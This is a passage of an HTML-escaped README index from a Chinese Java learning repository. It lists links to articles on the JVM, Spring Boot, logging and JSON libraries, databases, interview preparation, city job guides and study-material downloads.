href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/jvm/zijiema-zhiling.md&#34;&gt;JVM字节码指令详解&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/jvm/how-jvm-run-zijiema-zhiling.md&#34;&gt;虚拟机是如何执行字节码指令的？&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/jvm/hsdb.md&#34;&gt;HSDB（Hotspot Debugger）从入门到实战&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/jvm/asm.md&#34;&gt;史上最通俗易懂的ASM教程&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/jvm/compile-jdk.md&#34;&gt;自己编译JDK&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/jvm/neicun-jiegou.md&#34;&gt;深入理解JVM的内存结构&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/jvm/whereis-the-object.md&#34;&gt;Java 创建的对象到底放在哪？&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/jvm/gc.md&#34;&gt;咱们从头到尾说一次Java垃圾回收&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/jvm/tujie-gc.md&#34;&gt;图解Java的垃圾回收机制&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/jvm/problem-tools.md&#34;&gt;Java问题诊断和排查工具（查看JVM参数、内存使用情况及分析）&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/jvm/jit.md&#34;&gt;Java即时编译（JIT）器原理解析及实践&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/jvm/oom.md&#34;&gt;一次内存溢出排查优化实战&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/jvm/cpu-percent-100.md&#34;&gt;一次生产CPU 100% 排查优化实践&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/jvm/zongjie.md&#34;&gt;JVM 核心知识点总结&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;Java企业级开发&lt;/h1&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;[!NOTE]&lt;/p&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;strong&gt;到底能不能成为一名合格的 Java 程序员，从理论走向实战？Java 企业级开发这部分内容就是一个分水岭&lt;/strong&gt;！&lt;/li&gt; &#xA;  &lt;li&gt;纸上得来终觉浅，须知此事要躬行。&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h2&gt;开发工具&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/maven/maven.md&#34;&gt;终于把项目构建神器Maven捋清楚了~&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/git/git-qiyuan.md&#34;&gt;我在工作中是如何使用Git的&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/nginx/nginx.md&#34;&gt;5分钟带你深入浅出搞懂Nginx&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;IDE/编辑器&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/ide/4-debug-skill.md&#34;&gt;4个高级的IntelliJ IDEA调试技巧&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Spring&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/springboot/aop-log.md&#34;&gt;Spring AOP扫盲&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/springboot/ioc.md&#34;&gt;Spring IoC扫盲&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;SpringBoot&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/springboot/initializr.md&#34;&gt;一分钟快速搭建Spring Boot项目&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/springboot/mysql-druid.md&#34;&gt;Spring Boot 整合 MySQL 和 Druid&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/springboot/jpa.md&#34;&gt;Spring Boot 整合 JPA&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/springboot/thymeleaf.md&#34;&gt;Spring Boot 整合 Thymeleaf 模板引擎&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/springboot/transaction.md&#34;&gt;Spring Boot 如何开启事务支持？&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/springboot/Filter-Interceptor-Listener.md&#34;&gt;Spring Boot 中使用过滤器、拦截器、监听器&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/redis/redis-springboot.md&#34;&gt;Spring Boot 整合 Redis 实现缓存&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/springboot/logback.md&#34;&gt;Spring Boot 整合 Logback 定制日志框架&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/springboot/swagger.md&#34;&gt;Spring Boot 整合 Swagger-UI 实现在线API文档&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/gongju/knife4j.md&#34;&gt;Spring Boot 整合 Knife4j，美化强化丑陋的Swagger&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/springboot/springtask.md&#34;&gt;Spring Boot 整合 Spring Task 实现定时任务&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/kaiyuan/auto-generator.md&#34;&gt;Spring Boot 整合 MyBatis-Plus AutoGenerator 生成编程喵项目骨架代码&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;辅助工具/轮子&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/gongju/tabby.md&#34;&gt;Tabby：一款逼格更高的开源终端工具&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/gongju/warp.md&#34;&gt;Warp：一款21世纪人用的终端工具&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/gongju/choco.md&#34;&gt;Chocolatey：一款GitHub星标8.2k+的Windows命令行软件管理器&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/gongju/chiner.md&#34;&gt;chiner：一款开源的数据库设计神器&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/gongju/DBeaver.md&#34;&gt;DBeaver：一款免费的数据库操作工具&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/gongju/forest.md&#34;&gt;Forest：一款极简的声明式HTTP调用API框架&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/gongju/junit.md&#34;&gt;Junit：一个开源的Java单元测试框架&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/gongju/fastjson.md&#34;&gt;fastjson：阿里巴巴开源的JSON解析库&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/gongju/gson.md&#34;&gt;Gson：Google开源的JSON解析库&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/gongju/jackson.md&#34;&gt;Jackson：GitHub上star数最多的JSON解析库&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/gongju/log4j.md&#34;&gt;Log4j：Java日志框架的鼻祖&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/gongju/log4j2.md&#34;&gt;Log4j 2：Apache维护的一款高性能日志记录工具&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/gongju/logback.md&#34;&gt;Logback：Spring Boot内置的日志处理框架&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/gongju/slf4j.md&#34;&gt;SLF4J：阿里巴巴强制使用的日志门面担当&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;安全篇&lt;/h2&gt; &#xA;&lt;h2&gt;分布式&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/elasticsearch/rumen.md&#34;&gt;全文搜索引擎Elasticsearch入门教程&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/zookeeper/jibenjieshao.md&#34;&gt;可能是把ZooKeeper概念讲的最清楚的一篇文章&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/microservice/api-wangguan.md&#34;&gt;微服务网关：从对比到选型，由理论到实践&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;高性能&lt;/h2&gt; &#xA;&lt;h3&gt;消息队列&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/mq/rabbitmq-rumen.md&#34;&gt;RabbitMQ入门教程（概念、应用场景、安装、使用）&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/mq/100-budiushi.md&#34;&gt;怎么确保消息100%不丢失？&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;高可用&lt;/h2&gt; &#xA;&lt;h1&gt;数据库&lt;/h1&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;[!NOTE]&lt;/p&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;strong&gt;简而言之，就是按照数据结构来组织、存储和管理数据的仓库&lt;/strong&gt;。几乎所有的 Java 后端开发都要学习数据库这块的知识，包括关系型数据库 MySQL，缓存中间件 Redis，非关系型数据库 MongoDB 等。&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h2&gt;MySQL&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/mysql/redis-shuju-yizhixing.md&#34;&gt;如何保障MySQL和Redis的数据一致性？&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Redis&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/redis/rumen.md&#34;&gt;Redis入门(适合新手)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/redis/xuebeng-chuantou-jichuan.md&#34;&gt;聊聊缓存雪崩、穿透、击穿&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;MongoDB&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/mongodb/rumen.md&#34;&gt;MongoDB最基础入门教程&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;计算机基础&lt;/h1&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;[!NOTE]&lt;/p&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;strong&gt;计算机基础包括操作系统、计算机网络、计算机组成原理、数据结构与算法等&lt;/strong&gt;。对于任何一名想要走得更远的 Java 后端开发来说，都是必须要花时间和精力去夯实的。&lt;/li&gt; &#xA;  &lt;li&gt;万丈高露平地起，勿在浮沙筑高台。&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/cs/os.md&#34;&gt;计算机操作系统知识点大梳理&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/cs/wangluo.md&#34;&gt;计算机网络核心知识点大梳理&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;求职面试&lt;/h1&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;[!NOTE]&lt;/p&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;strong&gt;学习了那么多 Java 知识，耗费了无数的脑细胞，熬掉了无数根秀发，为的是什么？当然是谋取一份心仪的 offer 了&lt;/strong&gt;。那八股文、面试题、城市选择、优质面经又怎能少得了呢？&lt;/li&gt; &#xA;  &lt;li&gt;千淘万漉虽辛苦，吹尽狂沙始到金。&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h2&gt;面试题集合&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/baguwen/java-basic-34.md&#34;&gt;Java：34道精选高频面试题&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/collection/hashmap-interview.md&#34;&gt;Java：13道HashMap精选面试题&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/mianjing/redis12question.md&#34;&gt;Redis：12道精选高频面试题）&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/nginx/40-interview.md&#34;&gt;Nginx：40道精选面试题&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;背诵版八股文&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/baguwen/java-basic.md&#34;&gt;Java 基础八股文（背诵版）必看&lt;span&gt;👍&lt;/span&gt;&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/baguwen/java-thread.md&#34;&gt;Java 并发编程八股文（背诵版）必看&lt;span&gt;👍&lt;/span&gt;&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/baguwen/jvm.md&#34;&gt;Java 虚拟机八股文（背诵版）必看&lt;span&gt;👍&lt;/span&gt;&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/sidebar/herongwei/mysql.md&#34;&gt;MySQL 八股文（背诵版）必看&lt;span&gt;👍&lt;/span&gt;&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;优质面经&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/mianjing/shanganaliyun.md&#34;&gt;春招斩获深圳腾讯PCG和杭州阿里云&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://mp.weixin.qq.com/s/h2tV6v5Rh6jHdO9x0p63-g&#34;&gt;社招拿下阿里美团头条京东滴滴)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://mp.weixin.qq.com/s/0hCJy0m8nHm08HfyXKQT1A&#34;&gt;字节小姐姐的一份秋招攻略&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://mp.weixin.qq.com/s/6TYEDM73N68vKXpmLRKhHA&#34;&gt;面试常见词汇扫盲+常见大厂面试特点分享&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://mp.weixin.qq.com/s/vnMZY9Gsy3o1FwMi4f1GlA&#34;&gt;双非学历的社畜，历经 6 轮面试，最终拿下阿里Offer&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;面试准备&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://mp.weixin.qq.com/s/qurUqeD_VyiJRtB38vOuSw&#34;&gt;简历如何优化，简历如何投递，面试如何准备？&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://mp.weixin.qq.com/s/rO7cU4NX74CoWADo_O4IUw&#34;&gt;校招时间节点、简历编写、笔试、、HR面、实习等注意事项&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;城市选择&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/cityselect/beijing.md&#34;&gt;北京都有哪些牛逼的互联网公司？&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/cityselect/guangzhou.md&#34;&gt;想去广州了！&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/cityselect/shenzhen.md&#34;&gt;深圳有哪些牛批的互联网公司？&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/cityselect/xian.md&#34;&gt;西安有哪些不错的互联网公司？&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/cityselect/qingdao.md&#34;&gt;青岛有牛逼的互联网公司吗？&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/cityselect/zhengzhou.md&#34;&gt;郑州有哪些不错的互联网公司？&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/cityselect/suzhou.md&#34;&gt;想搬去苏州生活了。&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/cityselect/nanjing.md&#34;&gt;南京有哪些靠谱的互联网公司？&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/cityselect/hangzhou.md&#34;&gt;杭州有哪些顶级的互联网公司？&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/cityselect/chengdu.md&#34;&gt;成都有哪些牛批的互联网公司？&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;工作体会&lt;/h2&gt; &#xA;&lt;h1&gt;学习资源&lt;/h1&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;[!NOTE]&lt;/p&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;strong&gt;不知道学什么？不知道该怎么学？找不到优质的学习资源&lt;/strong&gt;？这些问题在这里统统都可以找到答案。&lt;/li&gt; &#xA;  &lt;li&gt;我会把自己十多年的编程经验和学习资源毫不保留的分享出来。&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h2&gt;PDF下载&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/download/java.md&#34;&gt;👏下载→Java程序员常读书单&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://mp.weixin.qq.com/s/US5nTxbC2nYc1hWpn5Bozw&#34;&gt;👏下载→最全最硬核的Java面试 “备战” 资料&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://mp.weixin.qq.com/s/pxKrjw_5NTdZfHOKCkwn8w&#34;&gt;👏下载→深入浅出Java多线程&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://mp.weixin.qq.com/s/d7Z0QoChNuP9bTwAGh2QCw&#34;&gt;👏下载→GitHub星标115k+的Java教程&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://mp.weixin.qq.com/s/PH5AizUAnTz0CuvJclpAKw&#34;&gt;👏下载→重学Java设计模式&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://mp.weixin.qq.com/s/FyoOPIMGcaeH0z5RMhxtaQ&#34;&gt;👏下载→Java版LeetCode刷题笔记&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/download/yuanyifeng-c-language.md&#34;&gt;👏下载→阮一峰C语言入门教程&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/download/bat-shuati.md&#34;&gt;👏下载→BAT大佬的刷题笔记&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://mp.weixin.qq.com/s/puTGbgU7xQnRcvz5hxGBHA&#34;&gt;👏下载→给操作系统捋条线&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/download/progit.md&#34;&gt;👏下载→豆瓣9.1分，Pro Git中文版&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/download/jianli.md&#34;&gt;👏下载→简历模板&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;知识库搭建历程&lt;/h1&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;[!NOTE] 从购买阿里云服务器+域名购买+域名备案+HTTP 升级到 HTTPS，全方面记录《Java 程序员进阶之路》知识库的诞生和改进过程，涉及到 docsify、Git、Linux 命令、GitHub 仓库等实用知识点。&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/szjy/tobebetterjavaer-beian.md&#34;&gt;阿里云服务器购买+宝塔面板安装+域名购买+域名备案+升级HTTPS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/szjy/tobebetterjavaer-wangzhan-shangxian.md&#34;&gt;使用docsify+Git+GitHub+码云+阿里云服务器搭建知识库网站&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;联系作者&lt;/h1&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;[!NOTE]&lt;/p&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;作者是一名普通普通普通普通三连的 Java 后端开发者，热爱学习，热爱分享&lt;/li&gt; &#xA;  &lt;li&gt;参加工作以后越来越理解交流和分享的重要性，在不停地汲取营养的同时，也希望帮助到更多的小伙伴们&lt;/li&gt; &#xA;  &lt;li&gt;Java 程序员进阶之路，不仅是作者自学 Java 以来所有的原创文章和学习资料的大聚合，更是作者向这个世界传播知识的一个窗口。&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h2&gt;心路历程&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/about-the-author/readme.md&#34;&gt;走近作者：个人介绍 Q&amp;amp;A&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/about-the-author/bzhan-10wan.md&#34;&gt;我的第一个，10 万(B站视频播放)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/about-the-author/zhihu-1000wan.md&#34;&gt;我的第一个，一千万！知乎阅读&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/itwanger/toBeBetterJavaer/master/docs/about-the-author/csdn-1000wan.md&#34;&gt;我的第二个，一千万！CSDN阅读&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;联系方式&lt;/h2&gt; &#xA;&lt;h3&gt;原创公众号&lt;/h3&gt; &#xA;&lt;p&gt;本号的slogan：技术文通俗易懂，吹水文风趣幽默。&lt;br&gt;目前已有 10 